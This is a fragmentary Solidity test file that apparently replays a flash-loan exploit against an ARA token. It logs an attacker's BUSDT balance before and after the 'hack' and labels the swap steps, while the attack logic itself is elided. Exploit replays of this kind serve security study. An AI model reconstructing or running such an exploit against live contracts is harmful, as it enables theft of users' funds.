...
contract ARATest is Test {
    ...
    function testExploit() public {
        ...
        emit log_named_decimal_uint(
            "Attacker BUSDT balance before hack",
        ...
        emit log_named_decimal_uint(
            "Attacker BUSDT balance after hack",
            BUSDT.balanceOf(address(this)),
            BUSDT.decimals()
        );
    }
    ...
    function DPPFlashLoanCall(
        ...
        emit log_named_decimal_uint(
            "Step 3. ARA amount out after first V3 swap",
        ...
        emit log_named_decimal_uint(
            "Step 5. BUSDT amount out after second V3 swap",
            BUSDT.balanceOf(address(this)),
            BUSDT.decimals()
        );
